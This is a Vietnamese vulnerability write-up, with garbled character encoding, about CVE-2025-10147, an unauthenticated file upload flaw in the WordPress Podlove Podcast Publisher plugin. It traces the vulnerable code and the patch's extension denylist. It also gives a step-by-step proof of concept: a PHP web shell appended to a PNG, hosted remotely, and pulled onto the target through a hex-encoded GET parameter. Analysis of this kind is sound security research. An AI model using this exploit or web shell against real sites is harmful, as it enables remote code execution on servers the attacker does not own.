# CVE-2025-10147 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Podlove Podcast Publisher** cho **WordPress** c√≥ l·ªó h·ªïng cho ph√©p **arbitrary file uploads** do thi·∫øu ki·ªÉm tra lo·∫°i t·ªáp trong h√†m `'move_as_original_file'` ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ªõi v√† bao g·ªìm **4.2.6**. ƒêi·ªÅu n√†y cho ph√©p **unauthenticated attackers** t·∫£i l√™n c√°c t·ªáp t√πy √Ω l√™n m√°y ch·ªß c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, ƒëi·ªÅu c√≥ th·ªÉ d·∫´n t·ªõi **remote code execution**.

* **CVE ID**: [CVE-2025-10147](https://www.cve.org/CVERecord?id=CVE-2025-10147)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 4.2.6
* **Patched Versions**: 4.2.7
* **CVSS severity**: High (10)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Podlove Podcast Publisher Plugin](https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Podlove Podcast Publisher**: **4.2.6** (vulnerable) v√† **4.2.7** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.

## Analysis

### Vulnerable Code 

Theo m√¥ t·∫£ c·ªßa CVE th√¨ v·ªã tr√≠ l·ªói n·∫±m ·ªü h√†m `move_as_original_file()` 

```php {title="image.php - v2.6.6" hl_lines=[3] data-open=true}
public function move_as_original_file($file)
{
    $move_new_file = @rename($file, $this->original_file());

    if (false === $move_new_file) {
        Log::get()->addWarning(
            sprintf(
                __('Podlove Image Cache: The downloaded image could not be moved to %s.'),
                $this->original_file()
            )
        );
    }
}
```

H√†m `move_as_original_file($file)`
* Th·ª±c hi·ªán **di chuy·ªÉn file t·∫°m `$file`** (v·ª´a ƒë∆∞·ª£c t·∫£i v·ªÅ t·ª´ URL)
  ‚Üí sang **ƒë∆∞·ªùng d·∫´n c·ªë ƒë·ªãnh** tr·∫£ v·ªÅ b·ªüi `$this->original_file()`.
* `rename()` trong PHP = **move file** (chuy·ªÉn v·ªã tr√≠ file, kh√¥ng copy).
* D·∫•u `@` d√πng ƒë·ªÉ **·∫©n l·ªói PHP** n·∫øu thao t√°c th·∫•t b·∫°i.
* N·∫øu `rename()` tr·∫£ v·ªÅ `false`, plugin ghi c·∫£nh b√°o v√†o log.

```php
public function original_file()
{
    return implode(DIRECTORY_SEPARATOR, [
        $this->upload_basedir, $this->file_name('original')
    ]);
}
```

‚Üí T·∫°o **ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi tr√™n server**, v√≠ d·ª•:

```
/var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png
```

`$this->upload_basedir` (t·ª´ `__construct()`)

```php {title="image.php - v2.6.6" hl_lines=[16,19,21,22] data-open=true}
Class Image {
    public function __construct($url, $file_name = '')
    {
        // FIXME: if $file_name is empty, the url will not work. I must not treat this silently!
        $this->source_url = trim($url ?? '');
        $this->file_name = sanitize_title($file_name);

        // manually remove troublemaking characters
        // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/
        // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947
        if (function_exists('iconv')) {
            $this->file_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this->file_name);
        }
        $this->file_name = preg_replace('~[^-a-z0-9_]+~', '', $this->file_name);

        $this->file_extension = $this->extract_file_extension();
        $this->id = md5($url.$this->file_name);

        // create subdirectories to avoid too many directories in the root directory
        $id_directory = substr($this->id, 0, 2).'/'.substr($this->id, 2);

        $this->upload_basedir = self::cache_dir().$id_directory;
        $this->upload_baseurl = content_url('cache/podlove/').$id_directory;
    }
}
```

ƒê∆∞·ª£c t·∫°o d·ª±a tr√™n `cache_dir()` v√† hash MD5 c·ªßa URL,
‚Üí n·∫±m trong th∆∞ m·ª•c:

```
wp-content/cache/podlove/<2 k√Ω t·ª± ƒë·∫ßu>/<ph·∫ßn c√≤n l·∫°i>/
```

> [!TIP] 
> ·ªû ƒë√¢y ta c√≥ th·ªÉ ch·ªâ truy·ªÅn m·ªói `$url`, v√≠ d·ª•:
>
> `$url="https://example.com/filename.php"` th√¨ `$this->id="b1555a128239e3f59ccfb8d17e5b6c5a"`
>
> `$this->upload_basedir="http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a"`
> 
> > [!Success] Ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c ƒë∆∞·ªùng d·∫´n c·ªßa file ƒë∆∞·ª£c t·∫°o.

`move_as_original_file()` ƒë∆∞·ª£c g·ªçi trong h√†m `download_source()`

```php {title="image.php - v2.6.6" hl_lines=[3,5,6,10,16,18,20,28,29] data-open=true}
public function download_source()
{
    $source_url = $this->source_url;
    ...
    $source_domain = wp_parse_url($source_url, PHP_URL_HOST);
    $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0];

    // if domains match, see if the image is part of the Publisher
    // and can be copied on the filesystem, skipping http
    if ($current_domain == $source_domain) {
        ...
        return;
    }
    // for download_url()
    require_once ABSPATH.'wp-admin/includes/file.php';
    $result = self::download_url($this->source_url);
    ...
    list($temp_file, $response) = $result;

    if (!\Podlove\is_image($temp_file)) {
        ...
        wp_delete_file($temp_file);
        return;
    }

    $this->create_basedir();
    $this->save_cache_data($response);
    $this->move_as_original_file($temp_file);
    wp_delete_file($temp_file);
    $this->add_donotbackup_dotfile();
}
```

H√†m n√†y t·∫£i ·∫£nh t·ª´ URL ng∆∞·ªùi d√πng cung c·∫•p, ki·ªÉm tra h·ª£p l·ªá, r·ªìi l∆∞u c·ªë ƒë·ªãnh v√†o th∆∞ m·ª•c cache c·ªßa plugin. C·ª• th·ªÉ:

1. `$source_url` l·∫•y URL h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p.
2. H√†m t√°ch domain t·ª´ `$source_url` v√† domain hi·ªán t·∫°i c·ªßa site (`$_SERVER['HTTP_HOST']`). 
    * N·∫øu hai domain tr√πng nhau ‚Üí ·∫£nh n·∫±m trong c√πng site th·ª±c hi·ªán logic v√† tr·∫£ v·ªÅ.
    * N·∫øu kh√°c domain ‚Üí d√πng `download_url()` ƒë·ªÉ t·∫£i file t·∫°m v·ªÅ m√°y ch·ªß.

```php {title="image.php - v2.6.6" hl_lines=[4,12,17,31] data-open=true}
public static function download_url($url, $timeout = 300, $extra_args = [])
{
    ...
    $tmpfname = wp_tempnam($url);
    if (!$tmpfname) {
        return new \WP_Error('http_no_file', __('Could not create Temporary file.'));
    }

    $default_args = [
        'timeout' => $timeout,
        'stream' => true,
        'filename' => $tmpfname,
        'sslverify' => \Podlove\get_setting('website', 'ssl_verify_peer') == 'on',
    ];
    $args = array_merge($default_args, $extra_args);

    $response = wp_safe_remote_get($url, $args);

    if (is_wp_error($response)) {
        wp_delete_file($tmpfname);

        return $response;
    }

    if (200 != wp_remote_retrieve_response_code($response)) {
        wp_delete_file($tmpfname);

        return new \WP_Error('http_404', trim(wp_remote_retrieve_response_message($response)));
    }

    return [$tmpfname, $response];
}
```

H√†m `download_url()` t·∫£i n·ªôi dung t·ª´ URL v√†o file t·∫°m tr√™n server v√† tr·∫£ v·ªÅ **ƒë∆∞·ªùng d·∫´n file ƒë√≥** c√πng **response**

3. Ki·ªÉm tra xem file t·∫£i v·ªÅ c√≥ ph·∫£i ·∫£nh h·ª£p l·ªá b·∫±ng `\Podlove\is_image()`

```php {title="helper.php - v2.6.6" hl_lines=[] data-open=true}
function is_image($file)
{
    $type = get_image_type($file);
    $mime = get_image_mime_type($type);

    return substr($mime, 0, 5) == 'image';
}
```

* ·ªû b·∫£n l·ªói, h√†m `is_image()` ch·ªâ **ki·ªÉm tra MIME type** c·ªßa file - c·ª• th·ªÉ l√† l·∫•y ki·ªÉu MIME r·ªìi xem n√≥ c√≥ b·∫Øt ƒë·∫ßu b·∫±ng "image" kh√¥ng.

> [!BUG]
> Ch·ªâ c·∫ßn file gi·∫£ d·∫°ng c√≥ header gi·ªëng ·∫£nh (v√≠ d·ª• file `.php` nh∆∞ng ch√®n v√†i byte ·∫£nh ƒë·∫ßu ti√™n `image/png`) l√† qua m·∫∑t ƒë∆∞·ª£c ngay üò¨

```php {title="helper.php - v2.6.7" hl_lines=[20,21,22] data-open=true}
function is_image($file, $filename = "")
{
    // simple PHP based checks
    $type = get_image_type($file);
    $mime = get_image_mime_type($type);
    $mime_is_image = substr($mime, 0, 5) == 'image';

    // more checks using WP helpers
    if (!$filename) {
      $filename = basename($file);
    }
    
    $check = wp_check_filetype_and_ext($file, $filename);
    $ext = isset($check['ext']) && $check['ext'] ? strtolower($check['ext']) : null;
    $wp_type = isset($check['type']) && $check['type'] ? strtolower($check['type']) : null;

    $wp_type_looks_correct = stripos($wp_type, 'image/') === 0;
    
    // denielist some exts for extra safety
    $danger_exts = [
      'php', 'php3', 'php4', 'php5', 'phtml', 'phar', 'pl', 'py', 'rb', 'cgi', 'asp', 'aspx', 'jsp',
    ];

    $ext_looks_dangerous = empty($ext) || in_array($ext, $danger_exts, true);

    return $mime_is_image && !$ext_looks_dangerous && $wp_type_looks_correct; 
}
```

* B·∫£n v√° ƒë√£ th√™m c·∫£ m·ªôt m·ªõ ki·ªÉm tra ch·∫∑t h∆°n:
    * V·∫´n gi·ªØ check MIME g·ªëc (`$mime_is_image`)
    * Th√™m check qua WordPress helper [`wp_check_filetype_and_ext()`](https://developer.wordpress.org/reference/functions/wp_check_filetype_and_ext/) ƒë·ªÉ so kh·ªõp ƒëu√¥i file v√† ki·ªÉu MIME th·ª±c t·∫ø
    * N·∫øu kh√¥ng c√≥ t√™n file, t·ª± l·∫•y `basename()` ƒë·ªÉ ki·ªÉm tra
    * Ch·∫∑n h√†ng lo·∫°t ƒëu√¥i nguy hi·ªÉm (`php`, `phar`, `py`, `jsp`, `v.v...`) b·∫±ng danh s√°ch ƒëen `$danger_exts`
    * K·∫øt h·ª£p ba ƒëi·ªÅu ki·ªán: ph·∫£i l√† MIME image, ƒëu√¥i kh√¥ng nguy hi·ªÉm, v√† WP c≈©ng nh·∫≠n di·ªán ƒë√∫ng ki·ªÉu ·∫£nh

4. Chuy·ªÉn file t·∫°m sang v·ªã tr√≠ th·∫≠t b·∫±ng `move_as_original_file($temp_file)`

---

`download_source()` ƒë∆∞·ª£c g·ªçi t·ª´ h√†m `podlove_handle_cache_files()` khi ·∫£nh ch∆∞a t·ªìn t·∫°i

```php {title="images.php - v4.2.6" data-open=true hl_lines=[3,6,8,9,14]}
function podlove_handle_cache_files()
{
    $source_url = \Podlove\PHP\hex2str(podlove_get_query_var('podlove_image_cache_url'));
    ...

    $image = new Image($source_url, $file_name);

    if (!$image->source_exists()) {
        $image->download_source();
    }
    ...
}

function podlove_get_query_var($var_name)
{
    if (isset($_GET[$var_name])) {
        return $_GET[$var_name];
    }

    return get_query_var($var_name);
}
```

H√†m `podlove_handle_cache_files()` nh·∫≠n tham s·ªë `podlove_image_cache_url` t·ª´ GET request, sau ƒë√≥ gi·∫£i m√£ b·∫±ng `hex2str()` ƒë·ªÉ chuy·ªÉn t·ª´ ƒë·ªãnh d·∫°ng hex sang chu·ªói.
=> Tham s·ªë `podlove_image_cache_url` ph·∫£i ƒë∆∞·ª£c truy·ªÅn d∆∞·ªõi d·∫°ng m√£ hex.

Ti·∫øp theo, h√†m kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng **Image** nh·∫±m t·∫°o ƒë∆∞·ªùng d·∫´n l∆∞u tr·ªØ trong cache v√† th·ª±c hi·ªán t·∫£i file t·ª´ URL ƒë√£ gi·∫£i m√£ v·ªÅ m√°y ch·ªß.
 
`podlove_handle_cache_files()` ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook

```php
add_action('wp', 'podlove_handle_cache_files');
``` 

Nghƒ©a l√† h√†m s·∫Ω ƒë∆∞·ª£c g·ªçi tr√™n m·ªói l·∫ßn WordPress x·ª≠ l√Ω request.

### Flow
{{< mermaid >}}
graph TD
A["Request with params (podlove_image_cache_url)"] --> B["podlove_handle_cache_files()"]
B --> C["hex2str() ‚Üí $source_url ‚Üí new Image(...)"]
C --> D["download_source() ‚Üí download_url() ‚Üí temporary file"]
D --> E["is_image() check"]
E -- pass --> F["move_as_original_file() ‚Üí save to wp-content/cache/podlove/first_2_characters/remaining_characters/"]
F --> G["File accessible ‚Üí possible RCE"]
E -- fail --> H["Delete temp file ‚Üí stop"]
{{< /mermaid >}}

## Exploit

### Proof of Concept (PoC)

1. Th√™m `<php>` tag v√†o file ·∫£nh v√† ƒë·ªïi extension th√†nh `.php`

```bash 
echo '<?php system($_REQUEST["cmd"]); ?>' >> rce.png
mv rce.png rce.php
```

```bash
‚ùØ cat rce.php
ÔøΩPNG
‚ê¶
IHDÔøΩÔøΩUdÔøΩtEXtSoftwaregnome-screenshotÔøΩÔøΩ>-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM +075ÔøΩÔøΩÔøΩÔøΩIDATHÔøΩÔøΩÔøΩA
ÔøΩ ÔøΩÔøΩGHIÔøΩÔøΩlÔøΩÔøΩlÔøΩÀÖÔøΩÔøΩKÔøΩnÔøΩD
ÔøΩH)ÔøΩÔøΩÔøΩa:koo‹≤<`ÔøΩuÔøΩoÔøΩ
ÔøΩ{ÔøΩ3ÔøΩ9ÔøΩ1ÔøΩ~ÔøΩÔøΩ      ÔøΩ9ÔøΩÔøΩÔøΩÔøΩPÔøΩ1ÔøΩÔøΩÔøΩÔøΩRÔøΩ!D>LkÔøΩÔøΩÔøΩFTÔøΩrÔøΩ|ÔøΩRuÔøΩÔøΩ	uÔøΩÔøΩo'ÔøΩ`ÔøΩÔøΩ?ÔøΩ!"ÔøΩÔøΩ
2kÔøΩÔøΩÔøΩIENDÔøΩB`ÔøΩ<?php system($_REQUEST["cmd"]); ?>
```

2. L∆∞u file ·ªü ƒë√¢u ƒë√≥ tr√™n internet, domain kh√¥ng tr√πng v·ªõi wordpress domain website,
v√≠ d·ª•:

```
https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php
```

3. M√£ h√≥a hex(https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php)

```bash
‚ùØ echo -n "https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php" | xxd -p
68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870
```

3. G·ª≠i GET request v·ªõi param `podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870`

![File Uploaded](file_uploaded.png "Upload file th√†nh c√¥ng")

4. Truy c·∫≠p file v·ª´a t·∫°o v√† RCE

![Result](result.png "RCE v·ªõi file upload")

> [!INFO]
> `02/9acf743e6beb9c8e4395ee694d6504` nh∆∞ ph√¢n t√≠ch tr∆∞·ªõc ƒë√≥, n√≥ l√† `md5($url)`, sau ƒë√≥ t·∫°o c·∫•u tr√∫c th∆∞ m·ª•c `first_2_characters/remaining_characters` d·ª±a tr√™n k·∫øt qu·∫£ c·ªßa `md5()`

## Conclusion

L·ªó h·ªïng trong **Podlove Podcast Publisher ‚â§ 4.2.6** cho ph√©p t·∫£i l√™n file t√πy √Ω do thi·∫øu ki·ªÉm tra ƒë·ªãnh d·∫°ng trong `move_as_original_file()`. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫£i file ƒë·ªôc h·∫°i (v√≠ d·ª• `.php`) l√™n th∆∞ m·ª•c:
`wp-content/cache/podlove/<first2>/<rest>/`,
t·ª´ ƒë√≥ d·∫´n ƒë·∫øn **Remote Code Execution (RCE)** n·∫øu file ƒë∆∞·ª£c truy c·∫≠p c√¥ng khai.

### Key Takeaway
* Nguy√™n nh√¢n: ki·ªÉm tra MIME y·∫øu, kh√¥ng ch·∫∑n ph·∫ßn m·ªü r·ªông nguy hi·ªÉm.
* B·∫£n v√° (‚â• 4.2.7): th√™m x√°c th·ª±c b·∫±ng `wp_check_filetype_and_ext()` v√† danh s√°ch denylist.
* C√°ch kh·∫Øc ph·ª•c: c·∫≠p nh·∫≠t plugin, ch·∫∑n th·ª±c thi PHP trong th∆∞ m·ª•c cache, x√≥a file l·∫°.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[ WordPress Podlove Podcast Publisher Plugin <= 4.2.6 is vulnerable to Arbitrary File Upload ](https://patchstack.com/database/wordpress/plugin/podlove-podcasting-plugin-for-wordpress/vulnerability/wordpress-podlove-podcast-publisher-plugin-4-2-6-unauthenticated-arbitrary-file-upload-vulnerability) 

---

> T√°c gi·∫£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/  

